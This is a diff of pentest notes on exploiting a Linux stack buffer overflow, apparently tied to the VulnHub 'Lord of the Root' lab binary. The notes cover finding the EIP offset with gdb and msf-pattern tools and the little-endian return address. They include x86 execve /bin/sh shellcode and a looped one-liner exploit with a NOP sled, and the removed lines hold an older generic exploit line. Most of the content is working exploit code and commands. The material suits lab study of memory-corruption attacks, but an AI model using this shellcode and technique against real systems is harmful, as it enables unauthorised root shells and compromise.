@@ -1,5 +1,4 @@
-# Simple
-- Disable ASLR
+# BOF
 1. Determine Buffer Size till EIP overflows with A
 	- Via fuzzing
 	- Buffer Size: 200
@@ -11,8 +10,7 @@
 	```
 3. Use `env`
 	```
-	# do not use ./
-	env - gdb /path/to/file
+	env - gdb /SECRET/door3/file
 	show env
 	unset env LINES
 	unset env COLUMNS
@@ -31,8 +29,8 @@
 	i r eip
 	```
 	- Pattern Address: `0x41376641`
-	- Return Address: `0xbffff630`
-		- Little Endian: `\x30\xf6\xff\xbf`
+	- Return Address: `0xbfb82e80`
+		- Little Endian: `\x80\x2e\xb8\xbf`
 5. Determine EIP offset
 	```
 	msf-pattern_offset -q 0x41376641
@@ -42,27 +40,13 @@
 	```
 	run  $(python -c 'print "A" * 171 + "B" * 4 + "C" * 200')
 	```
-7. Determine badChars 
-	- Unable to use found returnAdd yet, unless we are sure it does not contain badChars `\x00`
+7. Shellcode
 	```
-	run $(python -c 'print "A" * 268 + "B" * 4 + "badChars"')
-	x/40x $esp
-	
-	buffer = "A" * offset + "B" * 4 + badChars
+	┌──(root💀kali)-[~/vulnHub/Lord-of-the-root-1.0.1/192.168.236.10/exploit/bof]
+	└─# cat shellcode | sed 's/"//g' | tr -d '\n'
+	\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 	```
-	- badChars: ``
-8. [[pentest/Cheatsheet/Linux/Linux BOF/Shellcode]]
+8. Exploit
 	```
-	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+	for x in {1..1000}; do env - /SECRET/door3/file $(python -c 'print "A"*171 + "\x80\x2e\xb8\xbf" + "\x90" * 20000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'); done
 	```
-9. Exploit
-	```
-	env - /path/to/file $(python -c 'print "A" * 117  + "\x30\xf6\xff\xbf" + "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
-	
-	padding + returnAdd + NOP + shellcode
-	```
-	- If it does not work, play around with the returnAdd & try to use different shell codes
-		- Check if returnAdd has any badchars `\x00\x20`
-		- eg; if `\x20\x30\x40\x50` is your return add, but `\x20` is a bad char, use `\x21` instead
-		- If there is make sure to increase NOP size
-		
